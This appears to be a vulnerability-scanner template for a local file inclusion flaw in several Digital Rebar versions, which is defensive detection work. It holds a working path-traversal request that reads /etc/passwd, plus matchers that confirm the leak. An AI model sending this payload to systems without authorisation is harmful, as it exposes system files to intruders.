id: digitalrebar-traversal
name: Digital Rebar - Local File Inclusion
severity: high
confidence: tentative
description: Digital Rebar versions 4.3.0, 4.3.2, 4.3.3, 4.4.0, and maybe others are vulnerable to local file inclusion because
  web requests can navigate outside of DRP controlled areas.
reference: CWE-22
tags:
- lfi
- rackn
- digitalrebar
- vuln
requests:
- method: GET
  path: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
  matchers:
  - type: regex
    regex:
    - root:.*:0:0
  - type: header
    words:
    - 'X-Drp-Sha256sum:'
  - type: status
    status:
    - 200
  condition: and
